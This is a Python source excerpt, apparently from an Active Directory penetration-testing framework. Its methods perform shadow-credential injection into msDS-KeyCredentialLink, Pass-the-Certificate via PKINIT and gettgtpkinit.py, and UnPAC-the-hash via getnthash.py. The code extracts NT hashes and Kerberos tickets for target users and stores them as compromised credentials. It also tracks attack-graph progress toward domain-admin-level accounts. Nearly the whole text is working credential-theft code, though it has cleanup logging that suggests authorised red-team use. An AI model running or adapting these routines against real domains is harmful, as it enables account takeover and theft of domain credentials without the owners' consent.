    def add_shadow_credentials(
        self, domain, username, password, target_user, target_domain
    ):
        """Add shadow credentials (msDS-KeyCredentialLink) via native LDAP."""
        from adscan_internal.rich_output import mark_sensitive
        from adscan_internal.services.exploitation import ExploitationService
        from adscan_internal.services.smb_transport import resolve_pdc_host

        try:
            pdc_ip = self.domains_data[target_domain]["pdc"]
            pdc_hostname = self.domains_data[target_domain].get("pdc_hostname")
            pdc_host = resolve_pdc_host(
                pdc_ip=pdc_ip,
                pdc_hostname=pdc_hostname,
                domain=target_domain,
                kerberos=True,
            ) or pdc_ip
            service = ExploitationService()
            result = service.acl.add_shadow_credentials(
                pdc_host=pdc_host,
                domain=domain,
                username=username,
                password=password,
                target_user=target_user,
                kerberos=True,
                timeout=300,
            )

            if result.success and result.nt_hash:
                ledger = getattr(self, "environment_change_ledger", None)
                if ledger is not None:
                    try:
                        change_id = ledger.register_change(
                            kind="shadow_credentials_added",
                            domain=domain,
                            target=target_user,
                            detail={
                                "target_domain": target_domain,
                                "target_object": target_user,
                                "target_user": target_user,
                                "exec_username": username,
                                "executor_username": username,
                                "executor_auth_domain": domain,
                                "credential_lookup_domain": domain,
                                "added_key_credential_value": getattr(
                                    result, "added_key_credential_value", None
                                ),
                                "cleanup_success": getattr(
                                    result, "cleanup_success", None
                                ),
                                "cleanup_raw_output": getattr(
                                    result, "cleanup_raw_output", None
                                ),
                            },
                            method="Shadow Credentials (msDS-KeyCredentialLink)",
                        )
                        if getattr(result, "cleanup_success", None) is True:
                            ledger.mark_reverted(change_id)
                        elif isinstance(
                            getattr(self, "acl_cleanup_actions", None), list
                        ):
                            self.acl_cleanup_actions.append(
                                {
                                    "kind": "shadow_credentials_added",
                                    "domain": domain,
                                    "target_domain": target_domain,
                                    "target": target_user,
                                    "exec_username": username,
                                    "added_key_credential_value": getattr(
                                        result, "added_key_credential_value", None
                                    ),
                                    "_ledger_change_id": change_id,
                                }
                            )
                    except Exception as exc:
                        telemetry.capture_exception(exc)
                if getattr(result, "cleanup_success", None) is False:
                    print_warning(
                        "Shadow Credentials cleanup did not complete automatically. "
                        f"Manually review msDS-KeyCredentialLink on {mark_sensitive(target_user, 'user')}."
                    )
                marked_nt_hash = mark_sensitive(result.nt_hash, "password")
                marked_target_user = mark_sensitive(target_user, "user")
                print_warning(
                    f"NT Hash of user {marked_target_user} obtained: {marked_nt_hash}"
                )
                # When invoked from attack path execution, avoid prompting for
                # follow-up privilege escalation here; the orchestrator continues
                # with subsequent steps.
                self.add_credential(
                    domain,
                    target_user,
                    result.nt_hash,
                    prompt_for_user_privs_after=False,
                )
                return True

            print_error(
                "Could not obtain NT hash via shadow credentials. Check logs for details."
            )
            return False

        except Exception as e:
            telemetry.capture_exception(e)
            print_error("Error in add_shadow_credentials.")
            print_exception(show_locals=False, exception=e)
            return False

    def ptc_pfx(self, pfx_file, domain, pfx_password=None, username=None):
        """Attempts to extract TGT using gettgtpkinit.py"""
        try:
            if not username:
                username = Prompt.ask("Specify the user for the PFX file: ")

            # Create the kerberos directory if it does not exist
            workspace_cwd = self._get_workspace_cwd()
            kerberos_dir = domain_subpath(
                workspace_cwd, self.domains_dir, domain, self.kerberos_dir
            )
            os.makedirs(kerberos_dir, exist_ok=True)
            ccache = os.path.join(kerberos_dir, f"{username}.ccache")

            # Use Python from isolated venv if available, fallback to system python
            pkinittools_python = self.pkinittools_python or "python"
            pkinit_gettgt = os.path.join(
                TOOLS_INSTALL_DIR, "PKINITtools", "gettgtpkinit.py"
            )
            command = f"{pkinittools_python} {pkinit_gettgt} -dc-ip {self.domains_data[domain]['pdc']}"
            if pfx_password:
                command += f" -pfx-pass {pfx_password}"
            command += f" -cert-pfx {pfx_file} {domain}/{username} {ccache}"

            self.execute_ptc(command, domain, username)

        except Exception as e:
            telemetry.capture_exception(e)
            print_error("Error in ptc_pfx.")
            print_exception(show_locals=False, exception=e)
            return False

    def ptc_pem(self, domain, username, password, target_user, cert_file, key_file):
        """Obtains TGT using gettgtpkinit.py."""
        from adscan_internal.rich_output import mark_sensitive

        try:
            # Create the kerberos directory if it does not exist
            workspace_cwd = self._get_workspace_cwd()
            kerberos_dir = domain_subpath(
                workspace_cwd, self.domains_dir, domain, self.kerberos_dir
            )
            os.makedirs(kerberos_dir, exist_ok=True)
            ccache = os.path.join(kerberos_dir, f"{target_user}.ccache")

            # Use Python from isolated venv if available, fallback to system python
            pkinittools_python = self.pkinittools_python or "python"
            marked_domain = mark_sensitive(domain, "domain")
            pkinit_gettgt = os.path.join(
                TOOLS_INSTALL_DIR, "PKINITtools", "gettgtpkinit.py"
            )
            command = (
                f"{pkinittools_python} {pkinit_gettgt} -cert-pem {cert_file} -key-pem {key_file} "
                f"{marked_domain}/{target_user} {ccache}"
            )
            print_info("Obtaining TGT")

            self.execute_ptc(command, domain, target_user, username, password, domain)

        except Exception as e:
            telemetry.capture_exception(e)
            print_error("Error in ptc_pem.")
            print_exception(show_locals=False, exception=e)
            return None

    def ptc_certipy(
        self,
        domain,
        pfx_file,
        pfx_password=None,
        username=None,
        *,
        step_context: dict[str, object] | None = None,
        store_credential: bool = True,
        capability_bearing: bool = False,
    ):
        """Perform Pass-the-Certificate using native PKINIT and display the result."""
        from adscan_internal.rich_output import mark_sensitive
        from adscan_internal.services.attack_graph_service import (
            update_edge_status_by_labels,
        )
        from adscan_internal.services.adcs import (
            PassTheCertificateResult,
            native_ptc_enabled,
            pass_the_certificate_native,
        )

        try:
            pdc_ip = self.domains_data[domain]["pdc"]
            workspace_cwd = self._get_workspace_cwd()
            kerberos_dir = domain_subpath(
                workspace_cwd, self.domains_dir, domain, self.kerberos_dir
            )
            os.makedirs(kerberos_dir, exist_ok=True)

            result: PassTheCertificateResult | None = None
            if native_ptc_enabled():
                try:
                    print_info_debug(
                        "[ptc] Trying native PKINIT + UnPAC-the-hash "
                        f"(pfx={mark_sensitive(str(pfx_file), 'path')})"
                    )
                    native_result = pass_the_certificate_native(
                        domain=domain,
                        pdc_ip=pdc_ip,
                        pfx_file=pfx_file,
                        pfx_password=pfx_password,
                        username=username,
                        cwd=kerberos_dir,
                        domains_data=self.domains_data,
                    )
                    if native_result.success and native_result.nt_hash:
                        result = native_result
                    else:
                        print_info_debug(
                            "[ptc] Native PTC did not deliver an NT hash "
                            f"({native_result.error_message or 'no hash'})."
                        )
                        result = native_result
                except Exception as exc_native:  # noqa: BLE001
                    telemetry.capture_exception(exc_native)
                    print_info_debug(
                        f"[ptc] Native PTC raised "
                        f"{type(exc_native).__name__}: {exc_native}."
                    )

            if result is None:
                result = PassTheCertificateResult(
                    domain=domain,
                    principal=None,
                    username=None,
                    resolved_domain=None,
                    nt_hash=None,
                    ticket_path=None,
                    raw_output="",
                    success=False,
                    error_message="Native PKINIT did not deliver an NT hash.",
                )

            # A PKINIT TGT/ccache is a usable credential on its own — the NT hash
            # is a best-effort bonus that is unrecoverable on NTLM-disabled / AES-only
            # domains. Only fail when there is NO usable credential at all (no ccache
            # AND no hash). The ccache registration below feeds kerberos_tickets, which
            # downstream steps (DCSync/DRSUAPI, LDAP, SMB) select via Kerberos.
            if not result.success or not result.username or not (result.nt_hash or result.ticket_path):
                print_error(
                    result.error_message
                    or "Pass-the-Certificate did not obtain a usable credential (no TGT/ccache and no NT hash)."
                )
                # If we are executing within an attack path, mark the step as failed.
                try:
                    notes: dict[str, object] = {
                        "ptc_success": False,
                        "ptc_error": result.error_message or "unknown",
                    }
                    updated = False
                    if hasattr(self, "_update_active_attack_graph_step_status"):
                        updated = bool(
                            self._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                                domain=domain,
                                status="failed",
                                notes=notes,
                            )
                        )
                    if not updated and step_context:
                        from_label = str(step_context.get("from_label") or "")
                        to_label = str(step_context.get("to_label") or "")
                        relation = str(step_context.get("relation") or "")
                        if from_label and to_label and relation:
                            update_edge_status_by_labels(
                                self,
                                domain,
                                from_label=from_label,
                                relation=relation,
                                to_label=to_label,
                                status="failed",
                                notes={
                                    **notes,
                                    **(
                                        step_context.get("notes")
                                        if isinstance(step_context.get("notes"), dict)
                                        else {}
                                    ),
                                },
                            )
                            updated = True
                    if updated:
                        print_info_debug(
                            "[attack-graph] PTC updated step status to failed"
                        )
                except Exception:
                    pass
                return False

            # Use the resolved_domain from the principal if available
            resolved_domain = result.resolved_domain or domain

            print_info("Performing a Pass the Certificate")
            if result.nt_hash:
                cred_table = Table(
                    title="[bold green]Extracted NT Hash[/bold green]",
                    header_style="bold green",
                    box=rich.box.SIMPLE,
                )
                cred_table.add_column("Domain", style="cyan")
                cred_table.add_column("User", style="magenta")
                cred_table.add_column("NT Hash", style="green")
                marked_dom = mark_sensitive(resolved_domain, "domain")
                marked_user = mark_sensitive(result.username, "user")
                marked_nt_hash = mark_sensitive(result.nt_hash, "password")
                cred_table.add_row(marked_dom, marked_user, marked_nt_hash)
                self.console.print(cred_table)
            else:
                # NTLM-disabled / AES-only: no NT hash to recover. The PKINIT TGT
                # (ccache) is the deliverable and is registered into kerberos_tickets
                # below for Kerberos-backed downstream steps.
                print_success(
                    "Obtained a PKINIT TGT (Kerberos ccache) for "
                    f"{mark_sensitive(result.username, 'user')}@"
                    f"{mark_sensitive(resolved_domain, 'domain')} — NT hash not "
                    "recovered (UnPAC-the-hash unavailable; NTLM likely disabled). "
                    "Downstream steps will authenticate via Kerberos."
                )

            # Decide whether this Pass-the-Certificate satisfied the intended target user.
            expected_user = (username or "").strip()
            expected_norm = expected_user.lower() if expected_user else ""
            got_norm = str(result.username).strip().lower()
            is_expected = True
            if expected_norm and expected_norm != got_norm:
                is_expected = False
                marked_expected = mark_sensitive(expected_user, "user")
                print_warning(
                    "Pass-the-Certificate succeeded but returned a different principal "
                    f"than expected ({marked_expected})."
                )

            active_step = getattr(self, "_active_attack_graph_step", None)
            active_notes = (
                dict(active_step.notes)
                if hasattr(active_step, "notes") and isinstance(active_step.notes, dict)
                else {}
            )
            if hasattr(self, "_set_active_attack_graph_step") and all(
                isinstance(getattr(active_step, field, None), str)
                and str(getattr(active_step, field, "")).strip()
                for field in ("domain", "from_label", "relation", "to_label")
            ):
                refreshed_notes = dict(active_notes)
                if expected_user:
                    refreshed_notes["target_user"] = expected_user
                    refreshed_notes["expected_user"] = expected_user
                refreshed_notes["compromised_user"] = result.username
                refreshed_notes["principal"] = result.principal
                self._set_active_attack_graph_step(  # type: ignore[attr-defined]
                    domain=str(active_step.domain),
                    from_label=str(active_step.from_label),
                    relation=str(active_step.relation),
                    to_label=str(active_step.to_label),
                    notes=refreshed_notes,
                )

            if result.ticket_path:
                from adscan_internal.services.credential_store_service import (
                    CredentialStoreService,
                )

                CredentialStoreService().store_kerberos_ticket(
                    domains_data=self.domains_data,
                    domain=resolved_domain,
                    username=result.username,
                    ticket_path=result.ticket_path,
                )
                print_info_debug(
                    "[certipy] Registered Kerberos ccache from PTC: "
                    f"user={mark_sensitive(result.username, 'user')} "
                    f"ticket={mark_sensitive(result.ticket_path, 'path')}"
                )
                if capability_bearing:
                    # ESC13: the minted TGT carries a synthetic group SID in its
                    # PAC that a stored password/hash cannot reproduce. Mark the
                    # ccache prefer-over-password for this user so the resolver
                    # hands the next step the ticket, not a generic credential.
                    from adscan_internal.services.credential_store_service import (
                        mark_capability_bearing_ccache,
                    )

                    mark_capability_bearing_ccache(
                        self.domains_data,
                        domain=resolved_domain,
                        username=result.username,
                        ccache_path=result.ticket_path,
                    )
                    print_info_debug(
                        "certipy: Marked ccache capability-bearing (ESC13) for "
                        f"{mark_sensitive(result.username, 'user')}"
                    )

            if store_credential and result.nt_hash:
                self.add_credential(resolved_domain, result.username, result.nt_hash)
            elif store_credential and not result.nt_hash:
                # No NT hash (NTLM-disabled / AES-only). Do NOT store a null
                # password/hash credential — the usable credential is the PKINIT
                # ccache already registered in kerberos_tickets above, which
                # downstream Kerberos-backed steps select on their own.
                print_info_debug(
                    "[certipy] PTC yielded a ccache (no NT hash); credential is the "
                    "registered Kerberos ticket, not add_credential: "
                    f"user={mark_sensitive(result.username, 'user')} "
                    f"domain={mark_sensitive(resolved_domain, 'domain')}"
                )
            else:
                print_info_debug(
                    "[certipy] Skipping add_credential for PTC result by caller request: "
                    f"user={mark_sensitive(result.username, 'user')} "
                    f"domain={mark_sensitive(resolved_domain, 'domain')}"
                )

            # Mark the attack-graph step as success only if it achieved the expected user
            # (typically: DA) for this attack path.
            try:
                notes: dict[str, object] = {
                    "ptc_success": True,
                    "principal": result.principal,
                    "resolved_domain": resolved_domain,
                }
                if expected_user:
                    notes["expected_user"] = expected_user
                    notes["matched_expected_user"] = is_expected

                status = "success" if is_expected else "failed"
                updated = False
                if hasattr(self, "_update_active_attack_graph_step_status"):
                    updated = bool(
                        self._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                            domain=domain,
                            status=status,
                            notes=notes,
                        )
                    )
                if not updated and step_context:
                    from_label = str(step_context.get("from_label") or "")
                    to_label = str(step_context.get("to_label") or "")
                    relation = str(step_context.get("relation") or "")
                    if from_label and to_label and relation:
                        merged_notes = dict(
                            step_context.get("notes")
                            if isinstance(step_context.get("notes"), dict)
                            else {}
                        )
                        merged_notes.update(notes)
                        update_edge_status_by_labels(
                            self,
                            domain,
                            from_label=from_label,
                            relation=relation,
                            to_label=to_label,
                            status=status,
                            notes=merged_notes,
                        )
                        updated = True
                if updated:
                    marked_status = mark_sensitive(status, "status")
                    print_info_debug(
                        f"[attack-graph] PTC updated step status to {marked_status}"
                    )
            except Exception:
                pass
            return True

        except Exception as e:
            telemetry.capture_exception(e)
            print_error(f"Error in performing Pass The Certificate with Certipy: {e}")
            print_exception(show_locals=False, exception=e)
            return False

    def execute_ptc(
        self,
        command,
        domain,
        target_user,
        username=None,
        password=None,
        target_domain=None,
    ):
        """
        Executes the PTC command and processes its results.
        """
        print_info("Performing a Pass The Certificate")
        try:
            proc = self.run_command(command, timeout=300)

            # Combine stdout and stderr to search in both
            output = (proc.stdout or "") + (proc.stderr or "")

            if "Saved TGT to file" in output:
                print_success("TGT extracted successfully")

                # Search for the AS-REP encryption key in the output
                key_pattern = r"AS-REP encryption key.*?:\s*([a-f0-9]{64})"
                key_match = re.search(key_pattern, output, re.DOTALL)

                if key_match:
                    as_rep_key = key_match.group(1)
                    print_success(f"AS-REP encryption key: {as_rep_key}")
                    # Execute unpac the hash
                    self.unpac_the_hash(domain, target_user, as_rep_key)
                else:
                    print_error("Could not find the AS-REP encryption key")

            elif "ValueError: Invalid password or PKCS12 data" in output:
                print_error("PFX requires a password")
            elif "KDC_ERR_PADATA_TYPE_NOSUPP" in output:
                print_error(
                    "Cannot perform the Pass as the DC does not support PKINIT authentication"
                )
            elif "KDC_ERR_C_PRINCIPAL_UNKNOWN" in output:
                print_error("User not found in the Kerberos database")
            elif "KDC_ERR_CLIENT_NOT_TRUSTED" in output:
                print_error("User not trusted")
            else:
                print_error(
                    "Cannot perform the Pass The Certificate as the client trust failed or is not implemented"
                )

        except Exception as e:
            telemetry.capture_exception(e)
            print_error("Error in execute_ptc.")
            print_exception(show_locals=False, exception=e)

    def unpac_the_hash(self, domain, target_user, as_rep_key):
        """Obtains NT hash using getnthash.py."""
        from adscan_internal.rich_output import mark_sensitive

        try:
            # Use Python from isolated venv if available, fallback to system python
            pkinittools_python = self.pkinittools_python or "python"
            pkinit_getnthash = os.path.join(
                TOOLS_INSTALL_DIR, "PKINITtools", "getnthash.py"
            )
            hash_command = (
                f"KRB5CCNAME=domains/{domain}/kerberos/{target_user}.ccache {pkinittools_python} "
                f"{pkinit_getnthash} {domain}/{target_user} -key {as_rep_key}"
            )
            print_info("Obtaining NT hash")

            hash_result = self.run_command(hash_command, timeout=300)

            if hash_result.returncode == 0:
                # Extract the NT hash using a regular expression
                nt_hash_pattern = r"([a-f0-9]{32})\s*$"
                nt_hash_match = re.search(nt_hash_pattern, hash_result.stdout)

                if nt_hash_match:
                    nt_hash = nt_hash_match.group(1)
                    marked_nt_hash = mark_sensitive(nt_hash, "password")
                    print_success(f"NT Hash obtained: {marked_nt_hash}")
                    self.add_credential(domain, target_user, nt_hash)
                    return True
                else:
                    print_error("Could not extract the NT hash from the output")
                    return False
            else:
                print_error(f"Error obtaining NT hash: {hash_result.stderr}")
                return False

        except Exception as e:
            telemetry.capture_exception(e)
            print_error("Error in unpac_the_hash.")
            print_exception(show_locals=False, exception=e)
            return False

